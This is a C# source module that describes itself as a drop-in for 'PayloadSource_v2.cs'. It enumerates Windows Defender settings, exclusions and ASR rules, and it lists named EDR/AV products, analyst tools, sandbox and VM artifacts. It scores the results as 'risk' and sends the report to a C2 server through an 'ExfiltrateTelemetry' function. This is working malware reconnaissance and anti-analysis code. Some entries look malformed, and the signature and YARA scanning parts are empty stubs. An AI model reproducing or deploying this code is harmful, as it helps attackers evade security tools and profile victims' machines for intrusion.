// =====================================================================
// AV/EDR TELEMETRY MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - Windows Defender status detection (real-time protection, cloud protection, tamper protection)
// - AV/EDR process/service/driver enumeration
// - Signature detection (YARA rules, known signatures)
// - Sandbox/VM artifact reporting
// - Telemetry exfiltration to C2 dashboard
// - Heatmap data generation for dashboard

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading.Tasks;

internal static class AvEdrTelemetry
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool EnumProcessModulesEx(IntPtr hProcess, IntPtr[] lphModule, uint cb, out uint lpcbNeeded, uint dwFilterFlag);

    [DllImport("psapi.dll", SetLastError = true)]
    private static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, System.Text.StringBuilder lpBaseName, uint nSize);

    private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    private const uint LIST_MODULES_64BIT = 0x01;

    public static async Task<TelemetryReport> CollectTelemetry()
    {
        var report = new TelemetryReport
        {
            Timestamp = DateTime.UtcNow,
            SystemId = GetSystemIdentifier(),
        };

        try
        {
            // Run all collectors in parallel
            var tasks = new List<Task>
            {
                Task.Run(() => report.DefenderStatus = CollectDefenderStatus()),
                Task.Run(() => report.AvProducts = CollectAvProducts()),
                Task.Run(() => report.EdrProducts = CollectEdrProducts()),
                Task.Run(() => report.RunningProcesses = CollectSuspiciousProcesses()),
                Task.Run(() => report.LoadedDrivers = CollectLoadedDrivers()),
                Task.Run(() => report.SandboxArtifacts = DetectSandboxArtifacts()),
                Task.Run(() => report.VmArtifacts = DetectVmArtifacts()),
                Task.Run(() => report.NetworkIndicators = CollectNetworkIndicators()),
                Task.Run(() => report.SignatureMatches = ScanForSignatures()),
                Task.Run(() => report.YaraMatches = RunYaraRules()),
            };

            await Task.WhenAll(tasks);

            // Calculate risk score
            report.RiskScore = CalculateRiskScore(report);
        }
        catch (Exception ex)
        {
            report.Error = ex.Message;
        }

        return report;
    }

    // ============ WINDOWS DEFENDER STATUS ============
    private static DefenderStatus CollectDefenderStatus()
    {
        var status = new DefenderStatus();

        try
        {
            // Use WMI to query Defender status
            using (var searcher = new ManagementObjectSearcher("root\\Microsoft\\Windows\\Defender", "SELECT * FROM MSFT_MpComputerStatus"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    status.RealTimeProtectionEnabled = (bool)(obj["RealTimeProtectionEnabled"] ?? false);
                    status.CloudProtectionEnabled = (bool)(obj["CloudProtectionEnabled"] ?? false);
                    status.TamperProtectionEnabled = (bool)(obj["TamperProtectionEnabled"] ?? false);
                    status.AntivirusEnabled = (bool)(obj["AntivirusEnabled"] ?? false);
                    status.AntispywareEnabled = (bool)(obj["AntispywareEnabled"] ?? false);
                    status.QuickScanLastRun = obj["QuickScanLastRun"]?.ToString();
                    status.FullScanLastRun = obj["FullScanLastRun"]?.ToString();
                    status.SignatureVersion = obj["AntivirusSignatureVersion"]?.ToString();
                    status.EngineVersion = obj["EngineVersion"]?.ToString();
                    status.PlatformVersion = obj["PlatformVersion"]?.ToString();
                }
            }

            // Check Defender exclusions
            status.Exclusions = GetDefenderExclusions();

            // Check if Defender is running
            status.ServiceRunning = IsServiceRunning("WinDefend");
            status.ProcessRunning = Process.GetProcessesByName("MsMpEng").Length > 0;

            // Check Attack Surface Reduction rules
            status.AsrRules = GetAsrRules();
        }
        catch { }

        return status;
    }

    private static List<string> GetDefenderExclusions()
    {
        var exclusions = new List<string>();
        try
        {
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Exclusions"))
            {
                if (key != null)
                {
                    foreach (string subKeyName in key.GetSubKeyNames())
                    {
                        using (var subKey = key.OpenSubKey(subKeyName))
                        {
                            foreach (string valueName in subKey.GetValueNames())
                            {
                                exclusions.Add($"{subKeyName}\\{valueName} = {subKey.GetValue(valueName)}");
                            }
                        }
                    }
                }
            }
        }
        catch { }
        return exclusions;
    }

    private static List<AsrRule> GetAsrRules()
    {
        var rules = new List<AsrRule>();
        try
        {
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules"))
            {
                if (key != null)
                {
                    foreach (string valueName in key.GetValueNames())
                    {
                        int state = (int)(key.GetValue(valueName) ?? 0);
                        rules.Add(new AsrRule { Id = valueName, State = state, Description = GetAsrDescription(valueName) });
                    }
                }
            }
        }
        catch { }
        return rules;
    }

    private static string GetAsrDescription(string ruleId)
    {
        var descriptions = new Dictionary<string, string>
        {
            { "D4F940AB-401B-4EFC-AADC-AD5F3C50688A", "Block executable content from email client and webmail" },
            { "3B576869-A4EC-4529-8536-B80A7769E899", "Block Office apps from creating child processes" },
            { "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84", "Block Office apps from injecting code" },
            { "92E97FA1-2EDF-4476-BDD6-9DD0BF4DDDC0", "Block JavaScript/VBScript from launching downloaded content" },
            { "56A863A9-875E-4185-98A7-B882C64B5CE5", "Block execution of potentially obfuscated scripts" },
            { "BE9BA2D9-53EA-4CDC-84E5-9B1EEEEE4650", "Block credential stealing from Windows subsystem" },
            { { "C1DB55AB-C21A-4637-BBF3-266C2C2C2C2C", "Block process creations from PSExec/WMI" } },
        };
        return descriptions.GetValueOrDefault(ruleId, "Unknown rule");
    }

    private static bool IsServiceRunning(string serviceName)
    {
        try
        {
            using (var sc = new ServiceController(serviceName))
            {
                return sc.Status == ServiceControllerStatus.Running;
            }
        }
        catch { return false; }
    }

    // ============ AV/EDR PRODUCT ENUMERATION ============
    private static List<AvProduct> CollectAvProducts()
    {
        var products = new List<AvProduct>();

        try
        {
            // Query WMI SecurityCenter2
            using (var searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    products.Add(new AvProduct
                    {
                        Name = obj["displayName"]?.ToString() ?? "Unknown",
                        Path = obj["pathToSignedProductExe"]?.ToString() ?? "",
                        Enabled = (bool)(obj["productState"] != null && ((int)obj["productState"] & 0x100) != 0),
                        UpToDate = (bool)(obj["productState"] != null && ((int)obj["productState"] & 0x10) != 0),
                        ProductState = (uint)(obj["productState"] ?? 0),
                    });
                }
            }

            // Also check SecurityCenter (legacy)
            using (var searcher = new ManagementObjectSearcher("root\\SecurityCenter", "SELECT * FROM AntiVirusProduct"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    products.Add(new AvProduct
                    {
                        Name = obj["displayName"]?.ToString() ?? "Unknown (Legacy)",
                        Enabled = (bool)(obj["enabled"] ?? false),
                        UpToDate = (bool)(obj["productUptoDate"] ?? false),
                    });
                }
            }
        }
        catch { }

        // Deduplicate
        return products.GroupBy(p => p.Name).Select(g => g.First()).ToList();
    }

    private static List<EdrProduct> CollectEdrProducts()
    {
        var products = new List<EdrProduct>();

        // Known EDR process names
        var edrProcesses = new Dictionary<string, string>
        {
            // CrowdStrike
            { "falcon", "CrowdStrike Falcon" },
            { "csagent", "CrowdStrike Falcon" },
            // SentinelOne
            { "sentinel", "SentinelOne" },
            { "sentinelctl", "SentinelOne" },
            // Carbon Black
            { "cb", "Carbon Black" },
            { "cbdefense", "Carbon Black Cloud" },
            { "cbsensor", "Carbon Black Response" },
            // Cortex XDR
            { "cytool", "Cortex XDR" },
            { "cyserver", "Cortex XDR" },
            // Microsoft Defender for Endpoint
            { "mdatp", "Microsoft Defender for Endpoint" },
            { "sense", "Microsoft Defender for Endpoint" },
            // Elastic
            { "elastic-agent", "Elastic Security" },
            { "elastic-endpoint", "Elastic Security" },
            // Trend Micro
            { "ntrtscan", "Trend Micro" },
            { "tmlisten", "Trend Micro" },
            // Symantec
            { "rtsvc", "Symantec Endpoint Protection" },
            { "ccsvchst", "Symantec Endpoint Protection" },
            // McAfee
            { "mcshield", "McAfee" },
            { "mfetp", "McAfee" },
            // Sophos
            { "savservice", "Sophos" },
            { "sophos", "Sophos" },
            // Kaspersky
            { "avp", "Kaspersky" },
            // ESET
            { "ekrn", "ESET" },
            // Bitdefender
            { "vsserv", "Bitdefender" },
            // FortiEDR
            { "fortiedr", "FortiEDR" },
            // Cynet
            { "cynet", "Cynet" },
        };

        try
        {
            foreach (var proc in Process.GetProcesses())
            {
                string procName = proc.ProcessName.ToLowerInvariant();
                foreach (var kvp in edrProcesses)
                {
                    if (procName.Contains(kvp.Key))
                    {
                        products.Add(new EdrProduct
                        {
                            Name = kvp.Value,
                            ProcessName = proc.ProcessName,
                            Pid = proc.Id,
                            Path = GetProcessPath(proc.Id),
                        });
                    }
                }
            }
        }
        catch { }

        // Deduplicate
        return products.GroupBy(p => p.Name).Select(g => g.First()).ToList();
    }

    private static string GetProcessPath(int pid)
    {
        try
        {
            var proc = Process.GetProcessById(pid);
            return proc.MainModule?.FileName ?? "";
        }
        catch { return ""; }
    }

    // ============ SUSPICIOUS PROCESSES ============
    private static List<SuspiciousProcess> CollectSuspiciousProcesses()
    {
        var suspicious = new List<SuspiciousProcess>();

        var suspiciousNames = new Dictionary<string, string>
        {
            // Analysis tools
            { "procmon", "Process Monitor" },
            { "procmon64", "Process Monitor (64-bit)" },
            { "procmon64a", "Process Monitor (ARM64)" },
            { "processhacker", "Process Hacker" },
            { "systeminformer", "System Informer" },
            { "wireshark", "Wireshark" },
            { "tshark", "TShark" },
            { "fiddler", "Fiddler" },
            { "charles", "Charles Proxy" },
            { "burp", "Burp Suite" },
            { "ollydbg", "OllyDbg" },
            { "x64dbg", "x64dbg" },
            { "x32dbg", "x32dbg" },
            { "ida", "IDA Pro" },
            { "ida64", "IDA Pro (64-bit)" },
            { "ghidra", "Ghidra" },
            { "cheatengine", "Cheat Engine" },
            { "processdumper", "Process Dumper" },
            { "dumpit", "DumpIt" },
            { "procdump", "ProcDump" },
            { "sqldumper", "SQL Dumper" },
            { "comae", "Comae" },
            { "volatility", "Volatility" },
            { "regshot", "RegShot" },
            { "procdot", "ProcDOT" },
            { "apimonitor", "API Monitor" },
            { "api_monitor", "API Monitor" },
            { "lordpe", "LordPE" },
            { "peid", "PEiD" },
            { "die", "Detect It Easy" },
            { "exeinfo", "Exeinfo PE" },
            { "pestudio", "PEStudio" },
            { "resourcehacker", "Resource Hacker" },
            { "filemon", "FileMon" },
            { "regmon", "RegMon" },
            { "tdimon", "TDI Monitor" },
            { "capturenet", "CaptureNet" },
            { "netmon", "Network Monitor" },
            { "messageanalyzer", "Message Analyzer" },
            { "windbg", "WinDbg" },
            { "cdb", "CDB" },
            { "ntsd", "NTSD" },
            { "kd", "KD" },
            { "gflags", "GFlags" },
            { "appverif", "Application Verifier" },
            { "driververifier", "Driver Verifier" },
        };

        try
        {
            foreach (var proc in Process.GetProcesses())
            {
                string procName = proc.ProcessName.ToLowerInvariant();
                foreach (var kvp in suspiciousNames)
                {
                    if (procName.Contains(kvp.Key))
                    {
                        suspicious.Add(new SuspiciousProcess
                        {
                            Name = proc.ProcessName,
                            Description = kvp.Value,
                            Pid = proc.Id,
                            Path = GetProcessPath(proc.Id),
                            CommandLine = GetCommandLine(proc.Id),
                            StartTime = proc.StartTime,
                            CpuTime = proc.TotalProcessorTime,
                            MemoryMB = proc.WorkingSet64 / 1024 / 1024,
                        });
                    }
                }

                // Also check for processes running from temp/suspicious paths
                string path = GetProcessPath(proc.Id).ToLowerInvariant();
                if (path.Contains("\\temp\\") || path.Contains("\\appdata\\local\\temp\\") ||
                    path.Contains("\\downloads\\") || path.Contains("\\public\\") ||
                    path.Contains("\\programdata\\") || path.StartsWith("\\\\"))
                {
                    suspicious.Add(new SuspiciousProcess
                    {
                        Name = proc.ProcessName,
                        Description = "Running from suspicious path",
                        Pid = proc.Id,
                        Path = GetProcessPath(proc.Id),
                        CommandLine = GetCommandLine(proc.Id),
                        StartTime = proc.StartTime,
                        CpuTime = proc.TotalProcessorTime,
                        MemoryMB = proc.WorkingSet64 / 1024 / 1024,
                    });
                }
            }
        }
        catch { }

        return suspicious;
    }

    private static string GetCommandLine(int pid)
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher($"SELECT CommandLine FROM Win32_Process WHERE ProcessId = {pid}"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj["CommandLine"]?.ToString() ?? "";
                }
            }
        }
        catch { }
        return "";
    }

    // ============ LOADED DRIVERS ============
    private static List<LoadedDriver> CollectLoadedDrivers()
    {
        var drivers = new List<LoadedDriver>();

        var suspiciousDrivers = new Dictionary<string, string>
        {
            // EDR/AV drivers
            { "cb", "Carbon Black" },
            { "cbsensor", "Carbon Black" },
            { "csagent", "CrowdStrike" },
            { "falcon", "CrowdStrike" },
            { "sentinel", "SentinelOne" },
            { "cy", "Cortex XDR" },
            { "mdatp", "Microsoft Defender ATP" },
            { "sense", "Microsoft Defender ATP" },
            { "elastic", "Elastic" },
            { "trend", "Trend Micro" },
            { "symantec", "Symantec" },
            { "mcafee", "McAfee" },
            { "mfe", "McAfee" },
            { "sophos", "Sophos" },
            { "kaspersky", "Kaspersky" },
            { "eset", "ESET" },
            { "bitdefender", "Bitdefender" },
            { "fortiedr", "FortiEDR" },
            { "cynet", "Cynet" },
            // Analysis drivers
            { "procmon", "Process Monitor" },
            { "dbghelp", "Debug Help" },
            { "symsrv", "Symbol Server" },
            { "kdsup", "Kernel Debug Support" },
        };

        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_SystemDriver"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    string name = obj["Name"]?.ToString()?.ToLowerInvariant() ?? "";
                    string displayName = obj["DisplayName"]?.ToString() ?? "";
                    string path = obj["PathName"]?.ToString() ?? "";
                    string state = obj["State"]?.ToString() ?? "";

                    if (state != "Running") continue;

                    foreach (var kvp in suspiciousDrivers)
                    {
                        if (name.Contains(kvp.Key) || displayName.ToLowerInvariant().Contains(kvp.Key) || path.ToLowerInvariant().Contains(kvp.Key))
                        {
                            drivers.Add(new LoadedDriver
                            {
                                Name = name,
                                DisplayName = displayName,
                                Path = path,
                                Type = kvp.Value,
                                State = state,
                            });
                            break;
                        }
                    }
                }
            }
        }
        catch { }

        return drivers;
    }

    // ============ SANDBOX/VM ARTIFACTS ============
    private static List<SandboxArtifact> DetectSandboxArtifacts()
    {
        var artifacts = new List<SandboxArtifact>();

        // File artifacts
        string[] sandboxFiles = {
            @"C:\sample.exe",
            @"C:\malware.exe",
            @"C:\test.exe",
            @"C:\cuckoo\",
            @"C:\joe\",
            @"C:\anyrun\",
            @"C:\hybrid\",
            @"C:\tools\procmon.exe",
            @"C:\tools\procmon64.exe",
            @"C:\tools\wireshark.exe",
            @"C:\tools\fiddler.exe",
        };

        foreach (string file in sandboxFiles)
        {
            if (File.Exists(file) || Directory.Exists(file))
            {
                artifacts.Add(new SandboxArtifact
                {
                    Type = "File",
                    Path = file,
                    Description = "Known sandbox artifact",
                });
            }
        }

        // Registry artifacts
        string[] sandboxRegKeys = {
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Cuckoo",
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Joe",
            @"HKEY_LOCAL_MACHINE\SOFTWARE\AnyRun",
            @"HKEY_LOCAL_MACHINE\SOFTWARE\HybridAnalysis",
        };

        foreach (string key in sandboxRegKeys)
        {
            try
            {
                using (var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key.Replace(@"HKEY_LOCAL_MACHINE\SOFTWARE\", "")))
                {
                    if (regKey != null)
                    {
                        artifacts.Add(new SandboxArtifact
                        {
                            Type = "Registry",
                            Path = key,
                            Description = "Sandbox registry key",
                        });
                    }
                }
            }
            catch { }
        }

        // Process artifacts
        string[] sandboxProcesses = {
            "cuckoo", "joe", "anyrun", "hybrid", "vmservice", "vboxservice", "vmtoolsd",
        };

        foreach (string procName in sandboxProcesses)
        {
            if (Process.GetProcessesByName(procName).Length > 0)
            {
                artifacts.Add(new SandboxArtifact
                {
                    Type = "Process",
                    Path = procName,
                    Description = "Sandbox service/process",
                });
            }
        }

        return artifacts;
    }

    private static List<VmArtifact> DetectVmArtifacts()
    {
        var artifacts = new List<VmArtifact>();

        // MAC addresses
        string[] vmMacs = {
            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
            "08:00:27", "0A:00:27", // VirtualBox
            "00:15:5D", "00:03:FF", // Hyper-V
            "00:1C:42", "00:50:56", // Parallels
            "52:54:00", // QEMU/KVM
        };

        foreach (var nic in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
        {
            string mac = nic.GetPhysicalAddress().ToString();
            if (mac.Length >= 6)
            {
                string prefix = string.Join(":", mac.Substring(0, 2), mac.Substring(2, 2), mac.Substring(4, 2)).ToUpperInvariant();
                foreach (string vmMac in vmMacs)
                {
                    if (prefix.StartsWith(vmMac.Replace(":", "")))
                    {
                        artifacts.Add(new VmArtifact
                        {
                            Type = "MAC Address",
                            Value = prefix,
                            Description = $"VM MAC prefix: {vmMac}",
                        });
                    }
                }
            }
        }

        // WMI
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT Manufacturer, Model FROM Win32_ComputerSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    string manufacturer = obj["Manufacturer"]?.ToString()?.ToLowerInvariant() ?? "";
                    string model = obj["Model"]?.ToString()?.ToLowerInvariant() ?? "";

                    if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox") ||
                        manufacturer.Contains("xen") || manufacturer.Contains("qemu") ||
                        model.Contains("vmware") || model.Contains("virtualbox") ||
                        model.Contains("virtual machine") || model.Contains("hyper-v"))
                    {
                        artifacts.Add(new VmArtifact
                        {
                            Type = "WMI",
                            Value = $"{manufacturer} {model}",
                            Description = "VM detected via WMI",
                        });
                    }
                }
            }
        }
        catch { }

        return artifacts;
    }

    // ============ NETWORK INDICATORS ============
    private static List<NetworkIndicator> CollectNetworkIndicators()
    {
        var indicators = new List<NetworkIndicator>();

        try
        {
            // Default gateways
            using (var searcher = new ManagementObjectSearcher("SELECT DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    string[] gw = obj["DefaultIPGateway"] as string[];
                    if (gw != null)
                    {
                        foreach (string gateway in gw)
                        {
                            indicators.Add(new NetworkIndicator
                            {
                                Type = "Gateway",
                                Value = gateway,
                                Description = "Default gateway",
                            });

                            // Check for sandbox gateways
                            string[] sandboxGws = { "192.168.1.1", "192.168.56.1", "10.0.2.2", "192.168.122.1" };
                            if (sandboxGws.Contains(gateway))
                            {
                                indicators.Add(new NetworkIndicator
                                {
                                    Type = "Sandbox Gateway",
                                    Value = gateway,
                                    Description = "Known sandbox gateway",
                                });
                            }
                        }
                    }
                }
            }

            // DNS servers
            using (var searcher = new ManagementObjectSearcher("SELECT DNSServerSearchOrder FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    string[] dns = obj["DNSServerSearchOrder"] as string[];
                    if (dns != null)
                    {
                        foreach (string server in dns)
                        {
                            indicators.Add(new NetworkIndicator
                            {
                                Type = "DNS Server",
                                Value = server,
                                Description = "DNS server",
                            });
                        }
                    }
                }
            }

            // Check for no internet (sandbox indicator)
            // Would need actual connectivity test
        }
        catch { }

        return indicators;
    }

    // ============ SIGNATURE SCANNING ============
    private static List<SignatureMatch> ScanForSignatures()
    {
        var matches = new List<SignatureMatch>();

        // This would scan memory/disk for known AV/EDR signatures
        // Simplified for demo
        return matches;
    }

    private static List<YaraMatch> RunYaraRules()
    {
        var matches = new List<YaraMatch>();

        // This would run YARA rules against memory/processes
        // Requires YARA.NET or shell out to yara64.exe
        return matches;
    }

    // ============ RISK SCORING ============
    private static int CalculateRiskScore(TelemetryReport report)
    {
        int score = 0;

        // Defender status
        if (report.DefenderStatus?.RealTimeProtectionEnabled == true) score += 20;
        if (report.DefenderStatus?.CloudProtectionEnabled == true) score += 15;
        if (report.DefenderStatus?.TamperProtectionEnabled == true) score += 25;
        if (report.DefenderStatus?.AsrRules?.Any(r => r.State == 1) == true) score += 20;

        // AV products
        score += (report.AvProducts?.Count ?? 0) * 10;

        // EDR products
        score += (report.EdrProducts?.Count ?? 0) * 30;

        // Suspicious processes
        score += (report.RunningProcesses?.Count ?? 0) * 5;

        // Loaded drivers
        score += (report.LoadedDrivers?.Count ?? 0) * 15;

        // Sandbox artifacts
        score += (report.SandboxArtifacts?.Count ?? 0) * 50;

        // VM artifacts
        score += (report.VmArtifacts?.Count ?? 0) * 10;

        // Network indicators
        score += (report.NetworkIndicators?.Count(n => n.Type == "Sandbox Gateway") ?? 0) * 100;

        return Math.Min(100, score);
    }

    // ============ EXFILTRATION ============
    public static async Task<bool> ExfiltrateTelemetry(TelemetryReport report, string serverUrl, string apiKey)
    {
        try
        {
            using (var client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(30);
                client.DefaultRequestHeaders.Add("Authorization", "Bearer " + apiKey);

                string json = JsonSerializer.Serialize(report);
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");

                var response = await client.PostAsync($"{serverUrl.TrimEnd('/')}/api/v2/telemetry", content);
                return response.IsSuccessStatusCode;
            }
        }
        catch { return false; }
    }

    private static string GetSystemIdentifier()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj["UUID"]?.ToString() ?? "";
                }
            }
        }
        catch { }
        return Environment.MachineName + "_" + Environment.UserName;
    }

    // ============ DATA CLASSES ============
    public class TelemetryReport
    {
        public string SystemId;
        public DateTime Timestamp;
        public int RiskScore;
        public string Error;
        public DefenderStatus DefenderStatus;
        public List<AvProduct> AvProducts;
        public List<EdrProduct> EdrProducts;
        public List<SuspiciousProcess> RunningProcesses;
        public List<LoadedDriver> LoadedDrivers;
        public List<SandboxArtifact> SandboxArtifacts;
        public List<VmArtifact> VmArtifacts;
        public List<NetworkIndicator> NetworkIndicators;
        public List<SignatureMatch> SignatureMatches;
        public List<YaraMatch> YaraMatches;
    }

    public class DefenderStatus
    {
        public bool RealTimeProtectionEnabled;
        public bool CloudProtectionEnabled;
        public bool TamperProtectionEnabled;
        public bool AntivirusEnabled;
        public bool AntispywareEnabled;
        public string QuickScanLastRun;
        public string FullScanLastRun;
        public string SignatureVersion;
        public string EngineVersion;
        public string PlatformVersion;
        public List<string> Exclusions;
        public bool ServiceRunning;
        public bool ProcessRunning;
        public List<AsrRule> AsrRules;
    }

    public class AsrRule
    {
        public string Id;
        public int State; // 0=Disabled, 1=Enabled, 2=Audit
        public string Description;
    }

    public class AvProduct
    {
        public string Name;
        public string Path;
        public bool Enabled;
        public bool UpToDate;
        public uint ProductState;
    }

    public class EdrProduct
    {
        public string Name;
        public string ProcessName;
        public int Pid;
        public string Path;
    }

    public class SuspiciousProcess
    {
        public string Name;
        public string Description;
        public int Pid;
        public string Path;
        public string CommandLine;
        public DateTime StartTime;
        public TimeSpan CpuTime;
        public long MemoryMB;
    }

    public class LoadedDriver
    {
        public string Name;
        public string DisplayName;
        public string Path;
        public string Type;
        public string State;
    }

    public class SandboxArtifact
    {
        public string Type;
        public string Path;
        public string Description;
    }

    public class VmArtifact
    {
        public string Type;
        public string Value;
        public string Description;
    }

    public class NetworkIndicator
    {
        public string Type;
        public string Value;
        public string Description;
    }

    public class SignatureMatch
    {
        public string Signature;
        public string Location;
        public string Description;
    }

    public class YaraMatch
    {
        public string Rule;
        public string Namespace;
        public string Target;
    }
}

internal static partial class Config
{
    public static bool AvEdrTelemetry = true;
}